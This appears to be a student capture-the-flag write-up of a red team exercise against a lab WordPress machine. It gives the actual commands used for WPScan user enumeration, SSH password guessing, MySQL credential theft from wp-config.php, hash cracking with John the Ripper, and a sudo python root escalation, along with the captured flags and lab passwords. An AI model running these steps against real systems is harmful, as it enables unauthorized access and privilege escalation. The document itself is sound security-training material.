# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

`$ nmap -sV 192.168.1.110`
  <img src="/Images/NMAP-scan.png">

This scan identifies the services below as potential points of entry:
**Target 1**
1. Port 22/TCP 	Open 	SSH
2. Port 80/TCP 	Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn


### Critical Vulnerabilities

The following vulnerabilities were identified on each target:
- Target 1
  1. PORT ENUMERATION (Severity: MEDIUM)
	-Target1 is open and responsive to ping requests allow map enumeration
  2. WEAK PASSWORD POLICY (Severity HIGH)
	- User 'Michael' was able to use their username as password, no numerical or spacial characters were required.
	- OpenSSH was not configured to require further authentication beyond a simple password
  3. MISCONFIGURED WEBSITE
	- Sensitive data was found within public-facing source code. In addition password information saved within the MySQL database was unsalted, resulting in easily obtained user credentials.
  3. PYTHON ESCALATION
	- User Steven's `sudo` privileges were misconfigured allowing for the leverage of a known python script exploit


### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: *b9bbcb33ellb80be759c4e844862482d*
    - **Exploit Used**
    	1. WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
        - `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`


<img src="/Images/wpscan-users.png">
<img src="/Images/Flag1.png">

	2. Targeting user Michael *(Weak user credentials // lack of robust password policy)*
    	- Brief manual Brute Force attack to guess Michael’s password
    	- User password was found upon attempting most basic username duplication as password credential.
    	- Password: *michael*
 	3. SSH in as Michael traversing through directories and files.
    		- Flag 1 found in var/www/html folder at root in service.html in an HTML comment below the footer.
    		- Commands:
        		- `ssh michael@192.168.1.110`
        		- `pw: michael`
        		- `cd /var/www/html`
        		- `ls -l`
        		- `nano service.html`
  -  **flag2.txt**: *fc3fd58dcdad9ab23faca6e9a3e581c*
    - **Exploit Used**
      - Same SSH/Directory Traversal exploit for user Michael leveraged in the 1st exploit
      - Simple directory exploration found the 'flag2.txt' file plainly visible in the /var/www/ directory.
      - `cd /var/www/`
      - `ls -l`
      - `cat flag2.txt`
<img src="/Images/flag2.png">

- **Flag3: afc01ab56b50591e7dccf93122770cd2**
- Exploit Used:
    - Viewing the wp-config.php file *(unrestricted file permissions)* revealed both username and password for MySQL database access.
    - Captured credentials were used to access and investigate the database.
    - Flag 3 was found in wp_posts table in the wordpress database.
        - Commands:
            - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
            - `show databases;`
            - `use wordpress;` 
            - `show tables;`
            - `select * from wp_posts;`

<img src="/Images/flag3.png">


- **Flag4: 715dea6c055b9fe3337544932f2941ce**
- Exploit Used:
    - Unsalted password hash and the use of privilege escalation with Python.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
        - Once having gained access to the database credentials as Michael from the wp-config.php file, username and password hashes were exported from the MySQL database. 
        - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
            - Commands:
                - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
                - `show databases;`
                - `use wordpress;` 
                - `show tables;`
                - `select * from wp_users;`

        - <img src="/Images/mysql-users.png">

        - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
            - Command:
                - `john wp_hashes.txt`

        - <img src="/Images/john-show.png">

      	  	- Once Steven’s password hash was cracked, the next step was to open an SSH shell as Steven. Since Steven's account had `sudo` privileges a python script vulnerability was leveraged to gain root access.
           		 - Commands: 
               			 - `ssh steven@192.168.1.110`
               			 - `pw:pink84`
               			 - `sudo -l`
               			 - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
                			- `cd /root`
               			 - `ls`
               			 - `cat flag4.txt`

		- Python Escalate
			- <img src="/Images/python-escalate.png">

<img src="/Images/flag4.png">